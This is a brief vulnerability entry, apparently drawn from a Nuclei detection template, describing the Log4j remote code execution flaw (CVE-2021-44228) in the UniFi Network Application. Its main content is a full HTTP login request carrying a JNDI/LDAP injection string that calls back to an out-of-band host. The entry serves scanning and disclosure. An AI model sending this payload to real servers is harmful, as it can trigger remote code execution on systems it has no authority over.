# Vulnerability: UniFi Network Application - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`unifi-network-log4j-rce.yaml`)

## Description
UniFi Network Application is susceptible to a critical vulnerability in Apache Log4j (CVE-2021-44228) that may allow for remote code execution in an impacted implementation.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json; charset=utf-8
Origin: {{RootURL}}
Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage

{"username":"user","password":"pass","remember":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}","strict":true}
```

